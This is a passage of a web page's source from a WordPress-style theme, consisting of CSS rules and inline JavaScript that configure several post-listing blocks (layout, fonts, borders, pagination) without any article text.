button","f_btn_font_settings":"","f_btn_font_family":"","f_btn_font_size":"","f_btn_font_line_height":"","f_btn_font_style":"","f_btn_font_weight":"","f_btn_font_transform":"","f_btn_font_spacing":"","f_btn_":"","mix_color":"","mix_type":"","fe_brightness":"1","fe_contrast":"1","fe_saturate":"1","mix_color_h":"","mix_type_h":"","fe_brightness_h":"1","fe_contrast_h":"1","fe_saturate_h":"1","m_bg":"","color_overlay":"","shadow_shadow_header":"","shadow_shadow_title":"Module Shadow","shadow_shadow_size":"","shadow_shadow_offset_horizontal":"","shadow_shadow_offset_vertical":"","shadow_shadow_spread":"","shadow_shadow_color":"","title_txt":"","title_txt_hover":"","all_underline_height":"","all_underline_color":"","cat_bg":"","cat_bg_hover":"","cat_txt":"","cat_txt_hover":"","cat_border":"","cat_border_hover":"","meta_bg":"","author_txt":"","author_txt_hover":"","date_txt":"","ex_txt":"","com_bg":"","com_txt":"","rev_txt":"","audio_btn_color":"","audio_time_color":"","audio_bar_color":"","audio_bar_curr_color":"","shadow_m_shadow_header":"","shadow_m_shadow_title":"Meta info shadow","shadow_m_shadow_size":"","shadow_m_shadow_offset_horizontal":"","shadow_m_shadow_offset_vertical":"","shadow_m_shadow_spread":"","shadow_m_shadow_color":"","btn_bg":"","btn_bg_hover":"","btn_txt":"","btn_txt_hover":"","btn_border":"","btn_border_hover":"","pag_text":"","pag_h_text":"","pag_bg":"","pag_h_bg":"","pag_border":"","pag_h_border":"","ajax_pagination":"","ajax_pagination_next_prev_swipe":"","ajax_pagination_infinite_stop":"","css":"","tdc_css":"","td_column_number":1,"header_color":"","color_preset":"","border_top":"","class":"tdi_111","tdc_css_class":"tdi_111","tdc_css_class_style":"tdi_111_rand_style"}';
        block_tdi_111.td_column_number = "1";
        block_tdi_111.block_type = "td_flex_block_1";
        block_tdi_111.post_count = "5";
        block_tdi_111.found_posts = "362";
        block_tdi_111.header_color = "";
        block_tdi_111.ajax_pagination_infinite_stop = "";
        block_tdi_111.max_num_pages = "72";
        tdBlocksArray.push(block_tdi_111);
    </script>
    <style>
        .tdm_block.tdm_block_button {
            margin-bottom: 0
        }

        .tdm_block.tdm_block_button .tds-button {
            line-height: 0
        }

        .tdm_block.tdm_block_button.tdm-block-button-inline {
            display: inline-block
        }

        .tdm_block.tdm_block_button.tdm-block-button-full,
        .tdm_block.tdm_block_button.tdm-block-button-full .tdm-btn {
            display: block
        }

        .tdi_54 .tdm-btn {
            height: auto;
            padding: 12px 15px
        }
    </style>
    <style>
        .tdi_55 {
            padding: 12px 15px;
            height: auto;
            line-height: 1
        }

        .tdi_55 .tdm-btn-icon:first-child {
            margin-right: 12px
        }

        .tdi_55,
        .tdi_55:before {
            border-radius: 50px
        }

        .tdi_55 {
            font-family: KhmerOSSiemreap !important
        }
    </style>
    <style>
        .tdi_68 {
            margin-bottom: 0px !important
        }
    </style>
    <style>
        .tdi_68 .td-image-wrap {
            padding-bottom: 55%
        }

        .tdi_68 .entry-thumb {
            background-position: center 50%
        }

        .tdi_68 .td-image-container {
            flex: 0 0 40%;
            width: 40%;
            display: block;
            order: 1
        }

        .ie10 .tdi_68 .td-image-container,
        .ie11 .tdi_68 .td-image-container {
            flex: 0 0 auto
        }

        .tdi_68 .td-module-container {
            flex-direction: row;
            padding: 0 0 20px 0;
            border-width: 0 0 1px 0;
            border-style: solid;
            border-color: #000;
            border-color: #a0a0a0 !important
        }

        .tdi_68 .td-module-meta-info {
            flex: 1;
            border-color: #eaeaea
        }

        body .tdi_68 .td-favorite {
            font-size: 36px;
            box-shadow: 1px 1px 4px 0px rgba(0, 0, 0, 0.2)
        }

        .tdi_68 .td_module_wrap {
            padding-left: 15px;
            padding-right: 15px;
            padding-bottom: 12.5px;
            margin-bottom: 12.5px
        }

        .tdi_68 .td_block_inner {
            margin-left: -15px;
            margin-right: -15px
        }

        .tdi_68 .td-module-container:before {
            bottom: -12.5px;
            border-color: #eaeaea
        }

        .tdi_68 .td-post-vid-time {
            display: block
        }

        .tdi_68 .td-post-category:not(.td-post-extra-category) {
            display: none
        }

        .tdi_68 .td-author-photo .avatar {
            width: 20px;
            height: 20px;
            margin-right: 6px;
            border-radius: 50%
        }

        .tdi_68 .td-audio-player {
            opacity: 1;
            visibility: visible;
            height: auto;
            font-size: 13px
        }

        .tdi_68 .td-read-more {
            display: none
        }

        .tdi_68 .td-author-date {
            display: none
        }

        .tdi_68 .td-post-author-name {
            display: none
        }

        .tdi_68 .td-post-date,
        .tdi_68 .td-post-author-name span {
            display: none
        }

        .tdi_68 .entry-review-stars {
            display: none
        }

        .tdi_68 .td-icon-star,
        .tdi_68 .td-icon-star-empty,
        .tdi_68 .td-icon-star-half {
            font-size: 15px
        }

        .tdi_68 .td-module-comments {
            display: none
        }

        .tdi_68 .td_module_wrap:nth-last-child(1) {
            margin-bottom: 0;
            padding-bottom: 0
        }

        .tdi_68 .td_module_wrap:nth-last-child(1) .td-module-container:before {
            display: none
        }

        .tdi_68 .td-module-title a {
            box-shadow: inset 0 0 0 0 #000
        }

        .tdi_68 .entry-title {
            margin: 0 20px 0 0;
            font-size: 18px !important;
            line-height: 1.5 !important
        }

        .tdi_68 .td-excerpt {
            margin: 10px 20px 0 0;
            column-count: 1;
            column-gap: 48px
        }

        .tdi_68 .td-block-title a,
        .tdi_68 .td-block-title span {
            font-size: 18px !important;
            font-weight: 500 !important
        }

        html:not([class*='ie']) .tdi_68 .td-module-container:hover .entry-thumb:before {
            opacity: 0
        }

        @media (min-width:768px) {
            .tdi_68 .td-module-title a {
                transition: all 0.2s ease;
                -webkit-transition: all 0.2s ease
            }
        }

        @media (min-width:1019px) and (max-width:1140px) {
            .tdi_68 .td_module_wrap {
                padding-bottom: 12.5px;
                margin-bottom: 12.5px
            }

            .tdi_68 .td-module-container:before {
                bottom: -12.5px
            }

            .tdi_68 .td_module_wrap {
                padding-bottom: 12.5px !important;
                margin-bottom: 12.5px !important
            }

            .tdi_68 .td_module_wrap:nth-last-child(1) {
                margin-bottom: 0 !important;
                padding-bottom: 0 !important
            }

            .tdi_68 .td_module_wrap .td-module-container:before {
                display: block !important
            }

            .tdi_68 .td_module_wrap:nth-last-child(1) .td-module-container:before {
                display: none !important
            }

            .tdi_68 .td-module-title a {
                box-shadow: inset 0 0 0 0 #000
            }

            @media (min-width:768px) {
                .tdi_68 .td-module-title a {
                    transition: all 0.2s ease;
                    -webkit-transition: all 0.2s ease
                }
            }
        }

        @media (min-width:768px) and (max-width:1018px) {
            .tdi_68 .td-image-wrap {
                padding-bottom: 60%
            }

            .tdi_68 .td-image-container {
                flex: 0 0 45%;
                width: 45%
            }

            .ie10 .tdi_68 .td-image-container,
            .ie11 .tdi_68 .td-image-container {
                flex: 0 0 auto
            }

            .tdi_68 .td_module_wrap {
                padding-bottom: 12.5px;
                margin-bottom: 12.5px;
                padding-bottom: 12.5px !important;
                margin-bottom: 12.5px !important
            }

            .tdi_68 .td-module-container:before {
                bottom: -12.5px
            }

            .tdi_68 .td_module_wrap:nth-last-child(1) {
                margin-bottom: 0 !important;
                padding-bottom: 0 !important
            }

            .tdi_68 .td_module_wrap .td-module-container:before {
                display: block !important
            }

            .tdi_68 .td_module_wrap:nth-last-child(1) .td-module-container:before {
                display: none !important
            }

            .tdi_68 .td-module-title a {
                box-shadow: inset 0 0 0 0 #000
            }

            .tdi_68 .entry-title {
                font-size: 13px !important
            }

            @media (min-width:768px) {
                .tdi_68 .td-module-title a {
                    transition: all 0.2s ease;
                    -webkit-transition: all 0.2s ease
                }
            }
        }

        @media (max-width:767px) {
            .tdi_68 .td_module_wrap {
                padding-left: 10px;
                padding-right: 10px
            }

            .tdi_68 .td_block_inner {
                margin-left: -10px;
                margin-right: -10px
            }

            .tdi_68 .td_module_wrap {
                padding-bottom: 7.5px;
                margin-bottom: 7.5px;
                padding-bottom: 7.5px !important;
                margin-bottom: 7.5px !important
            }

            .tdi_68 .td-module-container:before {
                bottom: -7.5px
            }

            .tdi_68 .td-excerpt {
                display: none
            }

            .tdi_68 .td_module_wrap:nth-last-child(1) {
                margin-bottom: 0 !important;
                padding-bottom: 0 !important
            }

            .tdi_68 .td_module_wrap .td-module-container:before {
                display: block !important
            }

            .tdi_68 .td_module_wrap:nth-last-child(1) .td-module-container:before {
                display: none !important
            }

            .tdi_68 .td-module-title a {
                box-shadow: inset 0 0 0 0 #000
            }

            .tdi_68 .entry-title {
                font-size: 15px !important
            }

            @media (min-width:768px) {
                .tdi_68 .td-module-title a {
                    transition: all 0.2s ease;
                    -webkit-transition: all 0.2s ease
                }
            }
        }
    </style>
    <script>
        var block_tdi_68 = new tdBlock();
        block_tdi_68.id = "tdi_68";
        block_tdi_68.atts = '{"hide_audio":"yes","block_template_id":"td_block_template_8","border_color":"#bb0000","all_modules_space":"eyJhbGwiOiIyNSIsInBob25lIjoiMTUifQ==","image_height":"eyJhbGwiOiI1NSIsInBvcnRyYWl0IjoiNjAifQ==","image_floated":"float_right","image_width":"eyJhbGwiOiI0MCIsInBvcnRyYWl0IjoiNDUifQ==","show_excerpt":"eyJwaG9uZSI6Im5vbmUifQ==","show_review":"none","show_date":"none","show_author":"none","show_cat":"none","show_com":"none","show_btn":"none","f_header_font_size":"18","f_header_font_weight":"500","header_text_color":"#bb0000","f_title_font_size":"eyJhbGwiOiIxOCIsInBob25lIjoiMTUiLCJwb3J0cmFpdCI6IjEzIn0=","art_title":"0 20px 0 0","f_title_font_line_height":"1.5","art_excerpt":"10px 20px 0 0","modules_border_size":"0 0 1px 0","modules_border_color":"#a0a0a0","m_padding":"0 0 20px 0","tdc_css":"eyJhbGwiOnsibWFyZ2luLWJvdHRvbSI6IjAiLCJkaXNwbGF5IjoiIn19","category_id":"34","offset":"1","modules_on_row":"","modules_gap":"eyJhbGwiOiIzMCIsInBob25lIjoiMjAifQ==","limit":"3","el_class":"blog-list-image-right ","block_type":"td_flex_block_1","separator":"","custom_title":"","custom_url":"","title_tag":"","mc1_tl":"","mc1_title_tag":"","mc1_el":"","post_ids":"","taxonomies":"","category_ids":"","in_all_terms":"","tag_slug":"","autors_id":"","installed_post_types":"","include_cf_posts":"","exclude_cf_posts":"","sort":"","linked_posts":"","favourite_only":"","open_in_new_window":"","show_modified_date":"","time_ago":"","time_ago_add_txt":"ago","time_ago_txt_pos":"","review_source":"","td_query_cache":"","td_query_cache_expiration":"","td_ajax_filter_type":"","td_ajax_filter_ids":"","td_filter_default_txt":"All","td_ajax_preloading":"","container_width":"","modules_border_style":"","modules_border_radius":"","modules_divider":"","modules_divider_color":"#eaeaea","h_effect":"","image_size":"","image_alignment":"50","image_radius":"","hide_image":"","show_favourites":"","fav_size":"2","fav_space":"","fav_ico_color":"","fav_ico_color_h":"","fav_bg":"","fav_bg_h":"","fav_shadow_shadow_header":"","fav_shadow_shadow_title":"Shadow","fav_shadow_shadow_size":"","fav_shadow_shadow_offset_horizontal":"","fav_shadow_shadow_offset_vertical":"","fav_shadow_shadow_spread":"","fav_shadow_shadow_color":"","video_icon":"","video_popup":"yes","video_rec":"","spot_header":"","video_rec_title":"","video_rec_color":"","video_rec_disable":"","autoplay_vid":"yes","show_vid_t":"block","vid_t_margin":"","vid_t_padding":"","video_title_color":"","video_title_color_h":"","video_bg":"","video_overlay":"","vid_t_color":"","vid_t_bg_color":"","f_vid_title_font_header":"","f_vid_title_font_title":"Video pop-up article title","f_vid_title_font_settings":"","f_vid_title_font_family":"","f_vid_title_font_size":"","f_vid_title_font_line_height":"","f_vid_title_font_style":"","f_vid_title_font_weight":"","f_vid_title_font_transform":"","f_vid_title_font_spacing":"","f_vid_title_":"","f_vid_time_font_title":"Video duration text","f_vid_time_font_settings":"","f_vid_time_font_family":"","f_vid_time_font_size":"","f_vid_time_font_line_height":"","f_vid_time_font_style":"","f_vid_time_font_weight":"","f_vid_time_font_transform":"","f_vid_time_font_spacing":"","f_vid_time_":"","meta_info_align":"","meta_info_horiz":"layout-default","meta_width":"","meta_margin":"","meta_padding":"","meta_space":"","art_btn":"","meta_info_border_size":"","meta_info_border_style":"","meta_info_border_color":"#eaeaea","meta_info_border_radius":"","modules_category":"","modules_category_margin":"","modules_category_padding":"","modules_cat_border":"","modules_category_radius":"0","modules_extra_cat":"","author_photo":"","author_photo_size":"","author_photo_space":"","author_photo_radius":"","review_space":"","review_size":"2.5","review_distance":"","excerpt_col":"1","excerpt_gap":"","excerpt_middle":"","excerpt_inline":"","show_audio":"block","art_audio":"","art_audio_size":"1.5","btn_title":"","btn_margin":"","btn_padding":"","btn_border_width":"","btn_radius":"","pag_space":"","pag_padding":"","pag_border_width":"","pag_border_radius":"","prev_tdicon":"","next_tdicon":"","pag_icons_size":"","f_header_font_header":"","f_header_font_title":"Block header","f_header_font_settings":"","f_header_font_family":"","f_header_font_line_height":"","f_header_font_style":"","f_header_font_transform":"","f_header_font_spacing":"","f_header_":"","f_ajax_font_title":"Ajax categories","f_ajax_font_settings":"","f_ajax_font_family":"","f_ajax_font_size":"","f_ajax_font_line_height":"","f_ajax_font_style":"","f_ajax_font_weight":"","f_ajax_font_transform":"","f_ajax_font_spacing":"","f_ajax_":"","f_more_font_title":"Load more button","f_more_font_settings":"","f_more_font_family":"","f_more_font_size":"","f_more_font_line_height":"","f_more_font_style":"","f_more_font_weight":"","f_more_font_transform":"","f_more_font_spacing":"","f_more_":"","f_title_font_header":"","f_title_font_title":"Article title","f_title_font_settings":"","f_title_font_family":"","f_title_font_style":"","f_title_font_weight":"","f_title_font_transform":"","f_title_font_spacing":"","f_title_":"","f_cat_font_title":"Article category tag","f_cat_font_settings":"","f_cat_font_family":"","f_cat_font_size":"","f_cat_font_line_height":"","f_cat_font_style":"","f_cat_font_weight":"","f_cat_font_transform":"","f_cat_font_spacing":"","f_cat_":"","f_meta_font_title":"Article meta info","f_meta_font_settings":"","f_meta_font_family":"","f_meta_font_size":"","f_meta_font_line_height":"","f_meta_font_style":"","f_meta_font_weight":"","f_meta_font_transform":"","f_meta_font_spacing":"","f_meta_":"","f_ex_font_title":"Article excerpt","f_ex_font_settings":"","f_ex_font_family":"","f_ex_font_size":"","f_ex_font_line_height":"","f_ex_font_style":"","f_ex_font_weight":"","f_ex_font_transform":"","f_ex_font_spacing":"","f_ex_":"","f_btn_font_title":"Article read more button","f_btn_font_settings":"","f_btn_font_family":"","f_btn_font_size":"","f_btn_font_line_height":"","f_btn_font_style":"","f_btn_font_weight":"","f_btn_font_transform":"","f_btn_font_spacing":"","f_btn_":"","mix_color":"","mix_type":"","fe_brightness":"1","fe_contrast":"1","fe_saturate":"1","mix_color_h":"","mix_type_h":"","fe_brightness_h":"1","fe_contrast_h":"1","fe_saturate_h":"1","m_bg":"","color_overlay":"","shadow_shadow_header":"","shadow_shadow_title":"Module Shadow","shadow_shadow_size":"","shadow_shadow_offset_horizontal":"","shadow_shadow_offset_vertical":"","shadow_shadow_spread":"","shadow_shadow_color":"","title_txt":"","title_txt_hover":"","all_underline_height":"","all_underline_color":"","cat_bg":"","cat_bg_hover":"","cat_txt":"","cat_txt_hover":"","cat_border":"","cat_border_hover":"","meta_bg":"","author_txt":"","author_txt_hover":"","date_txt":"","ex_txt":"","com_bg":"","com_txt":"","rev_txt":"","audio_btn_color":"","audio_time_color":"","audio_bar_color":"","audio_bar_curr_color":"","shadow_m_shadow_header":"","shadow_m_shadow_title":"Meta info shadow","shadow_m_shadow_size":"","shadow_m_shadow_offset_horizontal":"","shadow_m_shadow_offset_vertical":"","shadow_m_shadow_spread":"","shadow_m_shadow_color":"","btn_bg":"","btn_bg_hover":"","btn_txt":"","btn_txt_hover":"","btn_border":"","btn_border_hover":"","pag_text":"","pag_h_text":"","pag_bg":"","pag_h_bg":"","pag_border":"","pag_h_border":"","ajax_pagination":"","ajax_pagination_next_prev_swipe":"","ajax_pagination_infinite_stop":"","css":"","td_column_number":1,"header_color":"","color_preset":"","border_top":"","class":"tdi_68","tdc_css_class":"tdi_68","tdc_css_class_style":"tdi_68_rand_style"}';
        block_tdi_68.td_column_number = "1";
        block_tdi_68.block_type = "td_flex_block_1";
        block_tdi_68.post_count = "3";
        block_tdi_68.found_posts = "173";
        block_tdi_68.header_color = "";
        block_tdi_68.ajax_pagination_infinite_stop = "";
        block_tdi_68.max_num_pages = "58";
        tdBlocksArray.push(block_tdi_68);
    </script>
    <style scoped="">
        .tdi_67 {
            vertical-align: baseline
        }

        .tdi_67 .vc_column-inner>.wpb_wrapper,
        .tdi_67 .vc_column-inner>.wpb_wrapper .tdc-elements {
            display: block
        }

        .tdi_67 .vc_column-inner>.wpb_wrapper .tdc-elements {
            width: 100%
        }

        .tdi_67 {
            border-color: #a0a0a0 !important;
            border-style: solid !important;
            border-width: 0px 0px 0px 1px !important
        }

        @media (max-width:767px) {
            .tdi_67 {
                border-width: 0px 0px 0px 0px !important
            }
        }
    </style>
    <style>
        .tdi_65 {
            margin-bottom: 15px !important
        }
    </style>
    <style>
        .tdi_65 .td-image-wrap {
            padding-bottom: 60%
        }

        .tdi_65 .entry-thumb {
            background-position: center 50%
        }

        .tdi_65 .td-module-container {
            flex-direction: column;
            border-color: #eaeaea !important
        }

        .tdi_65 .td-image-container {
            display: block;
            order: 0
        }

        .ie10 .tdi_65 .td-module-meta-info,
        .ie11 .tdi_65 .td-module-meta-info {
            flex: auto
        }

        body .tdi_65 .td-favorite {
            font-size: 36px;
            box-shadow: 1px 1px 4px 0px rgba(0, 0, 0, 0.2)
        }

        .tdi_65 .td-module-meta-info {
            border-color: #eaeaea
        }

        .tdi_65 .td_module_wrap {
            padding-left: 15px;
            padding-right: 15px;
            padding-bottom: 10px;
            margin-bottom: 10px
        }

        .tdi_65 .td_block_inner {
            margin-left: -15px;
            margin-right: -15px
        }

        .tdi_65 .td-module-container:before {
            bottom: -10px;
            border-color: #eaeaea
        }

        .tdi_65 .td-post-vid-time {
            display: block
        }

        .tdi_65 .td-post-category {
            margin: 5px;
            padding: 5px 8px 3px 8px;
            border-radius: 12px;
            background-color: #bb0000;
            font-size: 10px !important;
            font-weight: 500 !important
        }

        .tdi_65 .td-author-photo .avatar {
            width: 20px;
            height: 20px;
            margin-right: 6px;
            border-radius: 50%
        }

        .tdi_65 .td-audio-player {
            opacity: 1;
            visibility: visible;
            height: auto;
            font-size: 13px
        }

        .tdi_65 .td-read-more {
            display: none
        }

        .tdi_65 .td-author-date {
            display: none
        }

        .tdi_65 .td-post-author-name {
            display: none
        }

        .tdi_65 .td-post-date,
        .tdi_65 .td-post-author-name span {
            display: none
        }

        .tdi_65 .entry-review-stars {
            display: none
        }

        .tdi_65 .td-icon-star,
        .tdi_65 .td-icon-star-empty,
        .tdi_65 .td-icon-star-half {
            font-size: 15px
        }

        .tdi_65 .td-module-comments {
            display: none
        }

        .tdi_65 .td_module_wrap:nth-last-child(1) {
            margin-bottom: 0;
            padding-bottom: 0
        }

        .tdi_65 .td_module_wrap:nth-last-child(1) .td-module-container:before {
            display: none
        }

        .tdi_65 .td-module-title a {
            box-shadow: inset 0 0 0 0 #000
        }

        .tdi_65 .entry-title {
            margin: 10px 0 0 0;
            font-size: 20px !important;
            line-height: 1.5 !important
        }

        .tdi_65 .td-excerpt {
            column-count: 1;
            column-gap: 48px
        }

        html:not([class*='ie']) .tdi_65 .td-module-container:hover .entry-thumb:before {
            opacity: 0
        }

        @media (min-width:768px) {
            .tdi_65 .td-module-title a {
                transition: all 0.2s ease;
                -webkit-transition: all 0.2s ease
            }
        }

        @media (min-width:1019px) and (max-width:1140px) {
            .tdi_65 .td_module_wrap {
                padding-bottom: 10px;
                margin-bottom: 10px
            }

            .tdi_65 .td-module-container:before {
                bottom: -10px
            }

            .tdi_65 .td_module_wrap {
                padding-bottom: 10px !important;
                margin-bottom: 10px !important
            }

            .tdi_65 .td_module_wrap:nth-last-child(1) {
                margin-bottom: 0 !important;
                padding-bottom: 0 !important
            }

            .tdi_65 .td_module_wrap .td-module-container:before {
                display: block !important
            }

            .tdi_65 .td_module_wrap:nth-last-child(1) .td-module-container:before {
                display: none !important
            }

            .tdi_65 .td-module-title a {
                box-shadow: inset 0 0 0 0 #000
            }

            @media (min-width:768px) {
                .tdi_65 .td-module-title a {
                    transition: all 0.2s ease;
                    -webkit-transition: all 0.2s ease
                }
            }
        }

        @media (min-width:768px) and (max-width:1018px) {
            .tdi_65 .td_module_wrap {
                padding-bottom: 10px;
                margin-bottom: 10px
            }

            .tdi_65 .td-module-container:before {
                bottom: -10px
            }

            .tdi_65 .td_module_wrap {
                padding-bottom: 10px !important;
                margin-bottom: 10px !important
            }

            .tdi_65 .td_module_wrap:nth-last-child(1) {
                margin-bottom: 0 !important;
                padding-bottom: 0 !important
            }

            .tdi_65 .td_module_wrap .td-module-container:before {
                display: block !important
            }

            .tdi_65 .td_module_wrap:nth-last-child(1) .td-module-container:before {
                display: none !important
            }

            .tdi_65 .td-module-title a {
                box-shadow: inset 0 0 0 0 #000
            }

            .tdi_65 .entry-title {
                font-size: 18px !important
            }

            @media (min-width:768px) {
                .tdi_65 .td-module-title a {
                    transition: all 0.2s ease;
                    -webkit-transition: all 0.2s ease
                }
            }
        }

        @media (max-width:767px) {
            .tdi_65 .td_module_wrap {
                padding-bottom: 10px;
                margin-bottom: 10px
            }

            .tdi_65 .td-module-container:before {
                bottom: -10px
            }

            .tdi_65 .td-post-category {
                margin: 0px;
                border-radius: 1px
            }

            .tdi_65 .td_module_wrap {
                padding-bottom: 10px !important;
                margin-bottom: 10px !important
            }

            .tdi_65 .td_module_wrap:nth-last-child(1) {
                margin-bottom: 0 !important;
                padding-bottom: 0 !important
            }

            .tdi_65 .td_module_wrap .td-module-container:before {
                display: block !important
            }

            .tdi_65 .td_module_wrap:nth-last-child(1) .td-module-container:before {
                display: none !important
            }

            .tdi_65 .td-module-title a {
                box-shadow: inset 0 0 0 0 #000
            }

            @media (min-width:768px) {
                .tdi_65 .td-module-title a {
                    transition: all 0.2s ease;
                    -webkit-transition: all 0.2s ease
                }
            }
        }
    </style>
    <script>
        var block_tdi_65 = new tdBlock();
        block_tdi_65.id = "tdi_65";
        block_tdi_65.atts = '{"modules_on_row":"","limit":"1","hide_audio":"yes","show_btn":"none","show_audio":"","show_excerpt":"","show_review":"none","show_com":"none","image_height":"60","f_title_font_size":"eyJhbGwiOiIyMCIsInBvcnRyYWl0IjoiMTgifQ==","f_title_font_line_height":"1.5","modules_category":"image","show_cat":"","show_author":"none","show_date":"none","modules_gap":"30","all_modules_space":"20","f_cat_font_size":"10","f_cat_font_weight":"500","cat_bg":"#bb0000","modules_category_padding":"5px 8px 3px 8px","tdc_css":"eyJhbGwiOnsibWFyZ2luLWJvdHRvbSI6IjE1IiwiZGlzcGxheSI6IiJ9fQ==","art_title":"10px 0 0 0","category_id":"34","modules_category_margin":"eyJhbGwiOiI1IiwicGhvbmUiOiIwIn0=","modules_category_radius":"eyJhbGwiOjEyLCJwaG9uZSI6IjEifQ==","block_type":"td_flex_block_1","separator":"","custom_title":"","custom_url":"","block_template_id":"","title_tag":"","mc1_tl":"","mc1_title_tag":"","mc1_el":"","post_ids":"","taxonomies":"","category_ids":"","in_all_terms":"","tag_slug":"","autors_id":"","installed_post_types":"","include_cf_posts":"","exclude_cf_posts":"","sort":"","linked_posts":"","favourite_only":"","offset":"","open_in_new_window":"","show_modified_date":"","time_ago":"","time_ago_add_txt":"ago","time_ago_txt_pos":"","review_source":"","el_class":"","td_query_cache":"","td_query_cache_expiration":"","td_ajax_filter_type":"","td_ajax_filter_ids":"","td_filter_default_txt":"All","td_ajax_preloading":"","container_width":"","m_padding":"","modules_border_size":"","modules_border_style":"","modules_border_color":"#eaeaea","modules_border_radius":"","modules_divider":"","modules_divider_color":"#eaeaea","h_effect":"","image_size":"","image_alignment":"50","image_width":"","image_floated":"no_float","image_radius":"","hide_image":"","show_favourites":"","fav_size":"2","fav_space":"","fav_ico_color":"","fav_ico_color_h":"","fav_bg":"","fav_bg_h":"","fav_shadow_shadow_header":"","fav_shadow_shadow_title":"Shadow","fav_shadow_shadow_size":"","fav_shadow_shadow_offset_horizontal":"","fav_shadow_shadow_offset_vertical":"","fav_shadow_shadow_spread":"","fav_shadow_shadow_color":"","video_icon":"","video_popup":"yes","video_rec":"","spot_header":"","video_rec_title":"","video_rec_color":"","video_rec_disable":"","autoplay_vid":"yes","show_vid_t":"block","vid_t_margin":"","vid_t_padding":"","video_title_color":"","video_title_color_h":"","video_bg":"","video_overlay":"","vid_t_color":"","vid_t_bg_color":"","f_vid_title_font_header":"","f_vid_title_font_title":"Video pop-up article title","f_vid_title_font_settings":"","f_vid_title_font_family":"","f_vid_title_font_size":"","f_vid_title_font_line_height":"","f_vid_title_font_style":"","f_vid_title_font_weight":"","f_vid_title_font_transform":"","f_vid_title_font_spacing":"","f_vid_title_":"","f_vid_time_font_title":"Video duration text","f_vid_time_font_settings":"","f_vid_time_font_family":"","f_vid_time_font_size":"","f_vid_time_font_line_height":"","f_vid_time_font_style":"","f_vid_time_font_weight":"","f_vid_time_font_transform":"","f_vid_time_font_spacing":"","f_vid_time_":"","meta_info_align":"","meta_info_horiz":"layout-default","meta_width":"","meta_margin":"","meta_padding":"","meta_space":"","art_btn":"","meta_info_border_size":"","meta_info_border_style":"","meta_info_border_color":"#eaeaea","meta_info_border_radius":"","modules_cat_border":"","modules_extra_cat":"","author_photo":"","author_photo_size":"","author_photo_space":"","author_photo_radius":"","review_space":"","review_size":"2.5","review_distance":"","art_excerpt":"","excerpt_col":"1","excerpt_gap":"","excerpt_middle":"","excerpt_inline":"","art_audio":"","art_audio_size":"1.5","btn_title":"","btn_margin":"","btn_padding":"","btn_border_width":"","btn_radius":"","pag_space":"","pag_padding":"","pag_border_width":"","pag_border_radius":"","prev_tdicon":"","next_tdicon":"","pag_icons_size":"","f_header_font_header":"","f_header_font_title":"Block header","f_header_font_settings":"","f_header_font_family":"","f_header_font_size":"","f_header_font_line_height":"","f_header_font_style":"","f_header_font_weight":"","f_header_font_transform":"","f_header_font_spacing":"","f_header_":"","f_ajax_font_title":"Ajax categories","f_ajax_font_settings":"","f_ajax_font_family":"","f_ajax_font_size":"","f_ajax_font_line_height":"","f_ajax_font_style":"","f_ajax_font_weight":"","f_ajax_font_transform":"","f_ajax_font_spacing":"","f_ajax_":"","f_more_font_title":"Load more button","f_more_font_settings":"","f_more_font_family":"","f_more_font_size":"","f_more_font_line_height":"","f_more_font_style":"","f_more_font_weight":"","f_more_font_transform":"","f_more_font_spacing":"","f_more_":"","f_title_font_header":"","f_title_font_title":"Article title","f_title_font_settings":"","f_title_font_family":"","f_title_font_style":"","f_title_font_weight":"","f_title_font_transform":"","f_title_font_spacing":"","f_title_":"","f_cat_font_title":"Article category tag","f_cat_font_settings":"","f_cat_font_family":"","f_cat_font_line_height":"","f_cat_font_style":"","f_cat_font_transform":"","f_cat_font_spacing":"","f_cat_":"","f_meta_font_title":"Article meta info","f_meta_font_settings":"","f_meta_font_family":"","f_meta_font_size":"","f_meta_font_line_height":"","f_meta_font_style":"","f_meta_font_weight":"","f_meta_font_transform":"","f_meta_font_spacing":"","f_meta_":"","f_ex_font_title":"Article excerpt","f_ex_font_settings":"","f_ex_font_family":"","f_ex_font_size":"","f_ex_font_line_height":"","f_ex_font_style":"","f_ex_font_weight":"","f_ex_font_transform":"","f_ex_font_spacing":"","f_ex_":"","f_btn_font_title":"Article read more button","f_btn_font_settings":"","f_btn_font_family":"","f_btn_font_size":"","f_btn_font_line_height":"","f_btn_font_style":"","f_btn_font_weight":"","f_btn_font_transform":"","f_btn_font_spacing":"","f_btn_":"","mix_color":"","mix_type":"","fe_brightness":"1","fe_contrast":"1","fe_saturate":"1","mix_color_h":"","mix_type_h":"","fe_brightness_h":"1","fe_contrast_h":"1","fe_saturate_h":"1","m_bg":"","color_overlay":"","shadow_shadow_header":"","shadow_shadow_title":"Module Shadow","shadow_shadow_size":"","shadow_shadow_offset_horizontal":"","shadow_shadow_offset_vertical":"","shadow_shadow_spread":"","shadow_shadow_color":"","title_txt":"","title_txt_hover":"","all_underline_height":"","all_underline_color":"","cat_bg_hover":"","cat_txt":"","cat_txt_hover":"","cat_border":"","cat_border_hover":"","meta_bg":"","author_txt":"","author_txt_hover":"","date_txt":"","ex_txt":"","com_bg":"","com_txt":"","rev_txt":"","audio_btn_color":"","audio_time_color":"","audio_bar_color":"","audio_bar_curr_color":"","shadow_m_shadow_header":"","shadow_m_shadow_title":"Meta info shadow","shadow_m_shadow_size":"","shadow_m_shadow_offset_horizontal":"","shadow_m_shadow_offset_vertical":"","shadow_m_shadow_spread":"","shadow_m_shadow_color":"","btn_bg":"","btn_bg_hover":"","btn_txt":"","btn_txt_hover":"","btn_border":"","btn_border_hover":"","pag_text":"","pag_h_text":"","pag_bg":"","pag_h_bg":"","pag_border":"","pag_h_border":"","ajax_pagination":"","ajax_pagination_next_prev_swipe":"","ajax_pagination_infinite_stop":"","css":"","td_column_number":1,"header_color":"","color_preset":"","border_top":"","class":"tdi_65","tdc_css_class":"tdi_65","tdc_css_class_style":"tdi_65_rand_style"}';
        block_tdi_65.td_column_number = "1";
        block_tdi_65.block_type = "td_flex_block_1";
        block_tdi_65.post_count = "1";
        block_tdi_65.found_posts = "173";
        block_tdi_65.header_color = "";
        block_tdi_65.ajax_pagination_infinite_stop = "";
        block_tdi_65.max_num_pages = "173";
        tdBlocksArray.push(block_tdi_65);
    </script>
    <style scoped="">
        .tdi_64 {
            vertical-align: baseline
        }

        .tdi_64 .vc_column-inner>.wpb_wrapper,
        .tdi_64 .vc_column-inner>.wpb_wrapper .tdc-elements {
            display: block
        }

        .tdi_64 .vc_column-inner>.wpb_wrapper .tdc-elements {
            width: 100%
        }
    </style>
    <style scoped="">
        .tdi_62 {
            position: relative !important;
            top: 0;
